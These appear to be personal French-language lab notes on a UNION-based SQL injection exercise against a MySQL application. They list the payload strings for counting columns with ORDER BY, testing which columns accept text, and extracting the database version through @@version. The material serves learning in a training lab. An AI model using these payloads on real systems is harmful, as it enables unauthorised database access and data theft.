
![](../../Img/Pasted%20image%2020260722160437.png)
Pour commencer, on va d'abord voir combien de columns ils ont et lesquelles accceptent les string

'+ORDER+BY+1--
et on met + car vu que c'est mysql et qu'on doit mettre un espace 
![](../../Img/Pasted%20image%2020260722160446.png)
on met un + qui est interpreter comme un espace
'+ORDER+BY+1--+
et ainsi de suite 
![](../../Img/Pasted%20image%2020260722160453.png)
que 2 columns

passons à si ils acceptent du text ou pas

'+UNION+SELECT+'a',NULL--+
'+UNION+SELECT+NULL,'a'--+

LES 2 prennent du text et on va utiliser BANNER pour avoir les sysinfo

'+UNION+SELECT+NULL,@@version--+
'+UNION+SELECT+@@version,NULL--+

La deuxième proposition a été reussi 
![](../../Img/Pasted%20image%2020260722160502.png)
![](../../Img/Pasted%20image%2020260722160509.png)
